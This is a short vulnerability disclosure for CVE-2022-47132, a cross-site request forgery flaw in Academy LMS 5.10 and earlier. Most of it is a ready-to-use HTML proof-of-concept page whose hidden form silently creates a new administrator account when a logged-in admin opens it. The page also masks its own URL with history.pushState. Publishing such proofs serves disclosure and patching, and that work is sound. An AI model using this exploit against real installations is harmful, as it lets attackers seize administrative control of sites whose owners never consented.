# CVE-2022-47132
Academy LMS &lt;= 5.10 CSRF

# Description
Academy LMS is an application where people can create and advertise courses. The ability to add a new administrative user is vulnerable to CSRF, making it possible to use social engineering to gain admin access on the platform.

#Proof of Concept (POC)
The first step in our proof of concept is to authenticate to the platform with an administrative user.

After that, simply access the page that contains the code for exploiting the vulnerability, and see that a new administrative user has been added to the system.

Code used in the exploit:

```html
<html>
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://target.com/academy/admin/admins/add" method="POST">
      <input type="hidden" name="first&#95;name" value="csrf" />
      <input type="hidden" name="last&#95;name" value="vinix" />
      <input type="hidden" name="biography" value="&lt;p&gt;csrf&#32;poc&lt;&#47;p&gt;" />
      <input type="hidden" name="files" value="" />
      <input type="hidden" name="user&#95;image" value="" />
      <input type="hidden" name="email" value="username" />
      <input type="hidden" name="password" value="password" />
      <input type="hidden" name="facebook&#95;link" value="" />
      <input type="hidden" name="twitter&#95;link" value="" />
      <input type="hidden" name="linkedin&#95;link" value="" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>
```
